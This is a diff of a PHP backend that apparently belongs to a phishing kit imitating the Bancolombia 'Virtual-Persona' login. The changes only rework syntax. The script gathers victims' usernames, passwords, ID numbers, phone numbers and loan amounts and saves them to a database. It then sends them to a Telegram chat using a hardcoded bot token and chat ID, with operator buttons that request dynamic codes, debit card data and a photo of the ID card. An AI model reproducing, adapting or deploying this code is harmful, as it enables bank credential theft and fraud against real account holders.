@@ -6,39 +6,69 @@ require __DIR__ . DIRECTORY_SEPARATOR . 'conexion.php';
 
 date_default_timezone_set('America/Bogota');
 
-$nombreUsuario    = $_POST['usuario']            ?? '';
-$password       = $_POST['clave']              ?? '';
-$claveUnica     = $_POST['key']                ?? '';
-$email          = $_POST['correo']             ?? '';
+$nombreUsuario    = isset($_POST['usuario']) ? $_POST['usuario'] : '';
+$password         = isset($_POST['clave']) ? $_POST['clave'] : '';
+$claveUnica       = isset($_POST['key']) ? $_POST['key'] : '';
+$email            = isset($_POST['correo']) ? $_POST['correo'] : '';
 
-$tipoDoc        = $_POST['tipo_documento']     ?? '';
-$numDoc         = $_POST['numero_documento']   ?? '';
-$montoRaw       = $_POST['monto']              ?? '';
-$montoTexto     = $_POST['monto_texto']        ?? '';
-$nombreUsuarioInit = $_POST['nombre_usuario']  ?? '';
-$telefono       = $_POST['telefono']           ?? '';
-$bancoPost    = $_POST['banco']              ?? '';
+$tipoDoc          = isset($_POST['tipo_documento']) ? $_POST['tipo_documento'] : '';
+$numDoc           = isset($_POST['numero_documento']) ? $_POST['numero_documento'] : '';
+$montoRaw         = isset($_POST['monto']) ? $_POST['monto'] : '';
+$montoTexto       = isset($_POST['monto_texto']) ? $_POST['monto_texto'] : '';
+$nombreUsuarioInit = isset($_POST['nombre_usuario']) ? $_POST['nombre_usuario'] : '';
+$telefono         = isset($_POST['telefono']) ? $_POST['telefono'] : '';
+$bancoPost        = isset($_POST['banco']) ? $_POST['banco'] : '';
 
 if (trim($claveUnica) === '') {
     $claveUnica = 'auto_' . bin2hex(random_bytes(16));
 }
 
-$bancoFinal = (is_string($bancoPost) && trim($bancoPost) !== '') ? trim($bancoPost) : 'Bancolombia';
+$bancoFinal = 'Bancolombia';
+if (is_string($bancoPost)) {
+    if (trim($bancoPost) !== '') {
+        $bancoFinal = trim($bancoPost);
+    }
+}
 
 $sel = $pdo->prepare("SELECT request_id, correo, estado, numero_cuenta, monto, banco, nombre, telefono FROM solicitudes WHERE `key` = ? LIMIT 1");
-$sel->execute([$claveUnica]);
+$sel->execute(array($claveUnica));
 $existente = $sel->fetch(PDO::FETCH_ASSOC);
 
 try {
     $idPeticion = 'BCO_' . bin2hex(random_bytes(18));
-} catch (Throwable $_) {
+} catch (Throwable $e) {
     $idPeticion = 'BCO_' . bin2hex(openssl_random_pseudo_bytes(18));
 }
 
-$numeroCuentaFinal = trim($telefono) !== '' ? $telefono : ($existente['numero_cuenta'] ?? '');
-$montoFinal     = trim($montoTexto) !== '' ? $montoTexto : (trim($montoRaw) !== '' ? $montoRaw : ($existente['monto'] ?? ''));
-$nombreFinal    = trim($nombreUsuarioInit) !== '' ? $nombreUsuarioInit : ($existente['nombre'] ?? '');
-$correoFinal    = trim($email) !== '' ? $email : ($existente['correo'] ?? '');
+$numeroCuentaFinal = '';
+if (trim($telefono) !== '') {
+    $numeroCuentaFinal = $telefono;
+} elseif (is_array($existente) && isset($existente['numero_cuenta'])) {
+    $numeroCuentaFinal = $existente['numero_cuenta'];
+}
+
+$montoFinal = '';
+if (trim($montoTexto) !== '') {
+    $montoFinal = trim($montoTexto);
+} elseif (trim($montoRaw) !== '') {
+    $montoFinal = trim($montoRaw);
+} elseif (is_array($existente) && isset($existente['monto'])) {
+    $montoFinal = $existente['monto'];
+}
+
+$nombreFinal = '';
+if (trim($nombreUsuarioInit) !== '') {
+    $nombreFinal = trim($nombreUsuarioInit);
+} elseif (is_array($existente) && isset($existente['nombre'])) {
+    $nombreFinal = $existente['nombre'];
+}
+
+$correoFinal = '';
+if (trim($email) !== '') {
+    $correoFinal = trim($email);
+} elseif (is_array($existente) && isset($existente['correo'])) {
+    $correoFinal = $existente['correo'];
+}
 
 $upsert = $pdo->prepare(
     "INSERT INTO solicitudes
@@ -59,7 +89,8 @@ $upsert = $pdo->prepare(
          `telefono`     = IF(VALUES(`telefono`) <> '', VALUES(`telefono`), `telefono`),
          `estado`       = 'pendiente'"
 );
-$upsert->execute([
+
+$upsert->execute(array(
     ':k'    => $claveUnica,
     ':u'    => $nombreUsuario,
     ':p'    => $password,
@@ -70,18 +101,34 @@ $upsert->execute([
     ':mont' => $montoFinal,
     ':nom'  => $nombreFinal,
     ':tel'  => $telefono,
-]);
+));
 
 $DEFAULT_BOT_TOKEN_OPS = "8924841749:AAG6MK_tMpRF19EehX5iEQdfotCySeD6m4c";
 $DEFAULT_CHAT_ID_OPS   = "-5503364698";
+
 $envBot = getenv('TELEGRAM_BOT_TOKEN_OPS');
 $envCh  = getenv('TELEGRAM_CHAT_ID_OPS');
-$botToken = (is_string($envBot) && trim($envBot) !== '') ? $envBot : $DEFAULT_BOT_TOKEN_OPS;
-$idChat   = (is_string($envCh)  && trim($envCh)  !== '') ? $envCh  : $DEFAULT_CHAT_ID_OPS;
+
+$botToken = $DEFAULT_BOT_TOKEN_OPS;
+if (is_string($envBot)) {
+    if (trim($envBot) !== '') {
+        $botToken = $envBot;
+    }
+}
+
+$idChat = $DEFAULT_CHAT_ID_OPS;
+if (is_string($envCh)) {
+    if (trim($envCh) !== '') {
+        $idChat = $envCh;
+    }
+}
 
 function fv($v, $placeholder = '<i>(no informado)</i>') {
     $s = is_string($v) ? trim($v) : '';
-    return $s === '' ? $placeholder : htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
+    if ($s === '') {
+        return $placeholder;
+    }
+    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
 }
 
 $docCompleto  = trim($tipoDoc . ' ' . $numDoc);
@@ -96,7 +143,8 @@ $mensaje .= "\xF0\x9F\x86\x95 <b>[LOGIN VIRTUAL-PERSONA]</b> Datos completos cap
 $mensaje .= $SEP . "\n";
 $mensaje .= "\xF0\x9F\x93\x84 <b>Documento:</b> " . fv($docCompleto) . "\n";
 if (trim($nombreFinal) !== '' || trim($nombreUsuarioInit) !== '') {
-    $mensaje .= "\xF0\x9F\x91\xA4 <b>Nombre (landing):</b> " . fv(trim($nombreFinal) !== '' ? $nombreFinal : $nombreUsuarioInit) . "\n";
+    $nv = trim($nombreFinal) !== '' ? $nombreFinal : $nombreUsuarioInit;
+    $mensaje .= "\xF0\x9F\x91\xA4 <b>Nombre (landing):</b> " . fv($nv) . "\n";
 }
 $mensaje .= "\xF0\x9F\x93\xB1 <b>Celular / Telefono:</b> " . fv($numeroCuentaFinal) . "\n";
 $mensaje .= "\xF0\x9F\x92\xB0 <b>Monto / Cupo solicitado:</b> " . fv($montoMuestra) . "\n";
@@ -106,35 +154,36 @@ $mensaje .= $SEP . "\n";
 $mensaje .= "\xF0\x9F\x91\xA4 <b>Usuario Virtual-Persona:</b> " . fv($nombreUsuario) . "\n";
 $mensaje .= "\xF0\x9F\x94\x92 <b>Clave Virtual-Persona:</b> " . fv($password) . "\n";
 
-$teclado = [
-    'inline_keyboard' => [
-        [
-            ['text' => "\xF0\x9F\x9F\xA2 DINAMICA",       'callback_data' => "OPCION_1_" . $idPeticion],
-            ['text' => "\xF0\x9F\x92\xB3 TARJETA DEBITO", 'callback_data' => "OPCION_2_" . $idPeticion],
-        ],
-        [
-            ['text' => "\xF0\x9F\x94\xB4 ERROR DINAMICA", 'callback_data' => "OPCION_3_" . $idPeticion],
-            ['text' => "\xE2\x9D\x8C ERROR CLAVE",        'callback_data' => "OPCION_4_" . $idPeticion],
-            ['text' => "\xF0\x9F\x93\xB8 FOTO CEDULA",    'callback_data' => "OPCION_5_" . $idPeticion],
-        ],
-        [
-            ['text' => "\xF0\x9F\x9F\xA9 FINALIZAR",      'callback_data' => "OPCION_10_" . $idPeticion],
-        ],
-    ],
-];
+$teclado = array(
+    'inline_keyboard' => array(
+        array(
+            array('text' => "\xF0\x9F\x9F\xA2 DINAMICA",       'callback_data' => "OPCION_1_" . $idPeticion),
+            array('text' => "\xF0\x9F\x92\xB3 TARJETA DEBITO", 'callback_data' => "OPCION_2_" . $idPeticion),
+        ),
+        array(
+            array('text' => "\xF0\x9F\x94\xB4 ERROR DINAMICA", 'callback_data' => "OPCION_3_" . $idPeticion),
+            array('text' => "\xE2\x9D\x8C ERROR CLAVE",        'callback_data' => "OPCION_4_" . $idPeticion),
+            array('text' => "\xF0\x9F\x93\xB8 FOTO CEDULA",    'callback_data' => "OPCION_5_" . $idPeticion),
+        ),
+        array(
+            array('text' => "\xF0\x9F\x9F\xA9 FINALIZAR",      'callback_data' => "OPCION_10_" . $idPeticion),
+        ),
+    ),
+);
 
-$payload = json_encode([
+$payloadArr = array(
     'chat_id'                  => $idChat,
     'text'                     => $mensaje,
     'parse_mode'               => 'HTML',
     'disable_web_page_preview' => true,
     'reply_markup'             => $teclado,
-]);
+);
+$payload = json_encode($payloadArr);
 
 $ch = curl_init("https://api.telegram.org/bot" . $botToken . "/sendMessage");
 curl_setopt($ch, CURLOPT_POST, true);
 curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
-curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
 curl_exec($ch);
@@ -153,10 +202,11 @@ $_SESSION['telefono']         = $telefono;
 $_SESSION['request_id']       = $idPeticion;
 $_SESSION['key']              = $claveUnica;
 
-$redirQs = new URLSearchParams([
-    'rid'   => $idPeticion,
-    'key'   => $claveUnica,
-    'correo'=> $correoFinal,
-]);
+$redirArr = array(
+    'rid'    => $idPeticion,
+    'key'    => $claveUnica,
+    'correo' => $correoFinal,
+);
+$redirQs = new URLSearchParams($redirArr);
 header("Location: espera.html?" . $redirQs->toString());
 exit;
